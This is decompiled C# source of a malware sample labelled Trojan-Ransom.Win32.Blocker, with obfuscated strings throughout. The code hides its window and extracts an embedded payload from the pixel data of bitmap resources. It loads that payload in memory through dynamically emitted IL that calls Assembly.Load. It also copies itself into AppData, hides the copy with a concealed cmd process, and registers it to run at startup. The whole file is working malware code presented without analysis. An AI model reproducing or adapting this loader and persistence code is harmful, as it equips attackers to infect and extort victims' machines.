// Decompiled with JetBrains decompiler
// Type: 
// Assembly: BangBang___M, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 769E4E7F-CF46-4B42-AB5D-A0EF27259400
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bsmo-9df471ff26a9958bb60bde1afb1049410db5f4eb196cd454c59722fdb99cb067.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

public sealed class \u0008 : Form
{
  public IContainer \u0002;
  private string \u0003;
  private Thread \u0005;

  public \u0008()
  {
    this.Load += new EventHandler(this.\u0002);
    this.\u0003 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    Application.EnableVisualStyles();
    this.\u0002();
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(292, 266);
    this.Name = \u0006.\u0002(-1073150274);
    this.Text = \u0006.\u0002(-1073150274);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  [STAThread]
  public static void \u0002() => Application.Run((Form) new \u0008());

  protected override void Dispose(bool _param1)
  {
    if (_param1 && this.\u0002 != null)
      this.\u0002.Dispose();
    base.Dispose(_param1);
  }

  [DebuggerStepThrough]
  public void \u0002()
  {
  }

  public void \u0002(bool _param1, string _param2, string _param3)
  {
    try
    {
      if (!_param3.Contains(\u0006.\u0002(-1073150283)))
        _param3 += \u0006.\u0002(-1073150283);
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0002(-1073150304) + _param3;
      if (File.Exists(str1))
        return;
      \u0005.\u0002().FileSystem.CopyFile(Assembly.GetExecutingAssembly().Location, str1, true);
      if (_param1)
      {
        Process process = new Process();
        string str2 = (string) null;
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = \u0006.\u0002(-1073150312),
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        };
        process.Start();
        StreamReader standardOutput = process.StandardOutput;
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine(\u0006.\u0002(-1073150314) + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        standardInput.WriteLine(\u0006.\u0002(-1073150324) + _param3 + \u0006.\u0002(-1073150233));
        standardInput.WriteLine(\u0006.\u0002(-1073150258));
        str2 = standardOutput.ReadToEnd();
        standardInput.Close();
        standardOutput.Close();
      }
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0006.\u0002(-1073150267), true);
      if (registryKey.GetValue(_param2) == null)
        registryKey.SetValue(_param2, (object) str1);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public object \u0002(byte[] _param1) => _param1[60] == (byte) 128 ? (object) true : (object) false;

  public byte[] \u0002(Bitmap _param1)
  {
    List<byte> byteList = new List<byte>();
    int num1 = checked (_param1.Width - 1);
    int x = 0;
    while (x <= num1)
    {
      int num2 = checked (_param1.Height - 1);
      int y = 0;
      while (y <= num2)
      {
        System.Drawing.Color pixel = _param1.GetPixel(x, y);
        if (pixel != System.Drawing.Color.FromArgb(0, 0, 0, 0))
        {
          byteList.Add(pixel.R);
          byteList.Add(pixel.G);
          byteList.Add(pixel.B);
        }
        checked { ++y; }
      }
      checked { ++x; }
    }
    return byteList.ToArray();
  }

  public void \u0003()
  {
    \u0006.\u0002(-1073150455);
    \u0006.\u0002(-1073150150);
    object obj1 = (object) 0.2545874;
    object obj2 = (object) 0.06194216;
  }

  public void \u0005()
  {
    while (true)
      ;
  }

  public void \u0008()
  {
    while (true)
      ;
  }

  public object \u0002(byte[] _param1, object[] _param2, string _param3, string _param4)
  {
    object Instance1 = (object) new DynamicMethod(\u0006.\u0002(-1073150136), typeof (object), new System.Type[4]
    {
      typeof (byte[]),
      typeof (object[]),
      typeof (string),
      typeof (string)
    });
    object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance1, (System.Type) null, \u0006.\u0002(-1073150138), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, (System.Type) null, \u0006.\u0002(-1073150805), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150823), new object[1]
    {
      (object) typeof (Assembly)
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150725), new object[3]
    {
      (object) OpCodes.Call,
      (object) typeof (Assembly).GetMethod(\u0006.\u0002(-1073150742), new System.Type[1]
      {
        typeof (byte[])
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Stloc_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_2
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance2 = objectValue1;
    string MemberName1 = \u0006.\u0002(-1073150836);
    object[] objArray1 = new object[2]
    {
      (object) OpCodes.Brfalse_S,
      RuntimeHelpers.GetObjectValue(objectValue2)
    };
    object[] Arguments1 = objArray1;
    bool[] flagArray1 = new bool[2]{ false, true };
    bool[] CopyBack1 = flagArray1;
    NewLateBinding.LateCall(Instance2, (System.Type) null, MemberName1, Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
    if (flagArray1[1])
      objectValue2 = RuntimeHelpers.GetObjectValue(objArray1[1]);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_3
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance3 = objectValue1;
    string MemberName2 = \u0006.\u0002(-1073150836);
    object[] objArray2 = new object[2]
    {
      (object) OpCodes.Brfalse_S,
      RuntimeHelpers.GetObjectValue(objectValue2)
    };
    object[] Arguments2 = objArray2;
    bool[] flagArray2 = new bool[2]{ false, true };
    bool[] CopyBack2 = flagArray2;
    NewLateBinding.LateCall(Instance3, (System.Type) null, MemberName2, Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
    if (flagArray2[1])
      objectValue2 = RuntimeHelpers.GetObjectValue(objArray2[1]);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldloc_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_2
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150725), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (Assembly).GetMethod(\u0006.\u0002(-1073150751), new System.Type[1]
      {
        typeof (string)
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_3
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150725), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (System.Type).GetMethod(\u0006.\u0002(-1073150765), new System.Type[1]
      {
        typeof (string)
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldnull
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_1
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150725), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (MethodBase).GetMethod(\u0006.\u0002(-1073150781), new System.Type[2]
      {
        typeof (object),
        typeof (object[])
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ret
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance4 = objectValue1;
    string MemberName3 = \u0006.\u0002(-1073150916);
    object[] objArray3 = new object[1]
    {
      RuntimeHelpers.GetObjectValue(objectValue2)
    };
    object[] Arguments3 = objArray3;
    bool[] flagArray3 = new bool[1]{ true };
    bool[] CopyBack3 = flagArray3;
    NewLateBinding.LateCall(Instance4, (System.Type) null, MemberName3, Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
    if (flagArray3[0])
      RuntimeHelpers.GetObjectValue(objArray3[0]);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldloc_0
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150725), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (Assembly).GetProperty(\u0006.\u0002(-1073150932)).GetGetMethod(),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldnull
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ldarg_1
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150725), new object[3]
    {
      (object) OpCodes.Callvirt,
      (object) typeof (MethodBase).GetMethod(\u0006.\u0002(-1073150781), new System.Type[2]
      {
        typeof (object),
        typeof (object[])
      }),
      (object) null
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(objectValue1, (System.Type) null, \u0006.\u0002(-1073150836), new object[1]
    {
      (object) OpCodes.Ret
    }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
    return NewLateBinding.LateGet(Instance1, (System.Type) null, \u0006.\u0002(-1073150781), new object[2]
    {
      (object) null,
      (object) new object[4]
      {
        (object) _param1,
        (object) _param2,
        (object) _param3,
        (object) _param4
      }
    }, (string[]) null, (System.Type[]) null, (bool[]) null);
  }

  public void \u0006()
  {
    \u0006.\u0002(-1073150947);
    while (true)
      ;
  }

  public void \u000E()
  {
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u0006.\u0002(-1073150561);
      ProjectData.ClearProjectError();
    }
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u0006.\u0002(-1073150494);
      ProjectData.ClearProjectError();
    }
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    object obj = (object) 0.8420885;
  }

  public void \u000F()
  {
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    \u0006.\u0002(-1073150597);
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u0006.\u0002(-1073151236);
      ProjectData.ClearProjectError();
    }
    while (true)
    {
      object obj = (object) 0.8743107;
    }
  }

  public void \u0002\u2000()
  {
    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0002(-1073151441);
    ResourceManager resourceManager = new ResourceManager(\u0006.\u0002(-1073151460), Assembly.GetExecutingAssembly());
    int integer = Conversions.ToInteger(resourceManager.GetObject(\u0006.\u0002(-1073151486)));
    byte[] numArray1 = this.\u0002((Bitmap) resourceManager.GetObject(\u0006.\u0002(-1073151373)));
    if (File.Exists(path))
    {
      byte[] numArray2 = this.\u0002((Bitmap) resourceManager.GetObject(\u0006.\u0002(-1073151389)));
      if (Operators.ConditionalCompareObjectEqual(this.\u0002(numArray2), (object) true, false))
        this.\u0002(numArray1, new object[1]
        {
          (object) numArray2
        }, \u0006.\u0002(-1073151396), \u0006.\u0002(-1073151410));
      else
        this.\u0002(numArray1, new object[1]
        {
          (object) numArray2
        }, \u0006.\u0002(-1073151396), \u0006.\u0002(-1073151042));
    }
    else
    {
      int num1 = integer;
      int num2 = 0;
      while (num2 <= num1)
      {
        try
        {
          byte[] numArray3 = this.\u0002((Bitmap) resourceManager.GetObject(\u0006.\u0002(-1073151049) + num2.ToString()));
          if (Operators.ConditionalCompareObjectEqual(this.\u0002(numArray3), (object) true, false))
            this.\u0002(numArray1, new object[1]
            {
              (object) numArray3
            }, \u0006.\u0002(-1073151396), \u0006.\u0002(-1073151410));
          else
            this.\u0002(numArray1, new object[1]
            {
              (object) numArray3
            }, \u0006.\u0002(-1073151396), \u0006.\u0002(-1073151042));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num2; }
      }
      this.\u0002(true, \u0006.\u0002(-1073151069), \u0006.\u0002(-1073151083));
    }
    this.Close();
  }

  private void \u0002(object _param1, EventArgs _param2)
  {
    this.Hide();
    this.ShowInTaskbar = false;
    Control.CheckForIllegalCrossThreadCalls = false;
    this.\u0005 = new Thread(new ThreadStart(this.\u0002\u2000));
    this.\u0005.Start();
    if (File.Exists(this.\u0003))
      return;
    int num = (int) MessageBox.Show(\u0006.\u0002(-1073151099), \u0006.\u0002(-1073151016), MessageBoxButtons.OK, MessageBoxIcon.Hand);
  }
}
